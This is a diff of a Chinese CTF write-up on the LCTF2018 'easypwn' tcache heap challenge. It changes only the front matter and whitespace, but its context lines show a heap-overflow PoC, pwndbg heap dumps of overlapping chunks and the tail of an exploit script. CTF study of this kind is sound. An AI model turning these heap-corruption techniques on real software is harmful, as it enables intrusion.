@@ -1,14 +1,18 @@
 ---
-layout: post
-title:  "LCTF2018-easypwn-详解"
-date:   2018-11-21 16:20:00
-categories: WriteUp
-tags: WriteUp Pwn Tcache LCTF2018
+title: LCTF—easypwn详解
+author: nepire
+avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
+authorLink: 'https://nepire.github.io/'
+authorAbout: 逐梦者
+authorDesc: 逐梦者
+categories: 技术
+comments: true
+date: 2019-11-05 12:03:15
+tags:
+keywords:
+description:
+photos:
 ---
-
-* content
-{:toc}
-
 听说一血有pwnhub注册码拿就去试着打了一下周末的这场LCTF，结果作为签到题选手(笑)连签到题的一血都拿不到可能这就是命吧，不过遇到了一题不错的pwn，就详细的记录下解题思路和技巧吧
 
 本文首发于[安全客—LCTF2018-easypwn-详细解析](https://www.anquanke.com/post/id/164591)
@@ -23,9 +27,9 @@ tags: WriteUp Pwn Tcache LCTF2018
 先看下给的文件的基本信息
 
 ```bash
-➜  easy_heap file easy_heap 
+➜  easy_heap file easy_heap
 easy_heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped
-➜  easy_heap checksec easy_heap 
+➜  easy_heap checksec easy_heap
 [*] '/home/Ep3ius/pwn/process/easy_heap/easy_heap'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -77,7 +81,7 @@ void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
 }
 ```
 
-我们可以看到这是一个基础的菜单型程序，这里比较在意的是程序先calloc了一个0xa0大小的堆块，我们先了解下malloc和 calloc的区别主要在于calloc在动态分配完内存后，自动初始化该内存空间为零，而malloc不初始化，里边数据是随机的垃圾数据。 
+我们可以看到这是一个基础的菜单型程序，这里比较在意的是程序先calloc了一个0xa0大小的堆块，我们先了解下malloc和 calloc的区别主要在于calloc在动态分配完内存后，自动初始化该内存空间为零，而malloc不初始化，里边数据是随机的垃圾数据。
 
 ```c
 void new()
@@ -149,7 +153,7 @@ void __fastcall read_input_content(_BYTE *input, int chunk_size)
 #poc
 new(0x10,'aaaa') #0
 new(0x10,'aaaa') #1
-free(0) 
+free(0)
 new(0xf8,'a'*0xf8) #0
 ```
 
@@ -238,7 +242,7 @@ free(9)
 
 ```bash
 pwndbg> parseheap
-addr                prev                size                 status              fd                bk 
+addr                prev                size                 status              fd                bk
 0x564965142000      0x0                 0x250                Used                None              None
 0x564965142250      0x0                 0xb0                 Used                None              None
 0x564965142300      0x0                 0x100                Used                None              None
@@ -297,7 +301,7 @@ pwndbg> x/8x 0x556bf9a1ec00
 
 ```bash
 pwndbg> parseheap
-addr                prev                size                 status              fd                bk 
+addr                prev                size                 status              fd                bk
 0x5624364b4000      0x0                 0x250                Used                None              None
 0x5624364b4250      0x0                 0xb0                 Used                None              None
 0x5624364b4300      0x0                 0x100                Used                None              None
@@ -313,7 +317,7 @@ addr                prev                size                 status             
 
 ```bash
 pwndbg> parseheap
-addr                prev                size                 status              fd                bk 
+addr                prev                size                 status              fd                bk
 0x55fe2fe46000      0x0                 0x250                Used                None              None
 0x55fe2fe46250      0x0                 0xb0                 Used                None              None
 0x55fe2fe46300      0x0                 0x100                Used                None              None
@@ -346,8 +350,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x565551ed3c00 (size : 0x20400) 
-       last_remainder: 0x0 (size : 0x0) 
+                  top: 0x565551ed3c00 (size : 0x20400)
+       last_remainder: 0x0 (size : 0x0)
             unsortbin: 0x0
 (0x100)   tcache_entry[14]:0x565551ed3b10 --> 0x565551ed3b10 (overlap chunk with 0x565551ed3b00(freed) )
 pwndbg> parseheap
@@ -472,6 +476,3 @@ n.interactive()
 ### 总结
 
 这次LCTF学到了不少，感谢丁佬没打死我还告诉我调试得出来puts出来的是里面的值里面不是指针，下次一定要好好学习跟上大哥们的解题速度
-
-
-
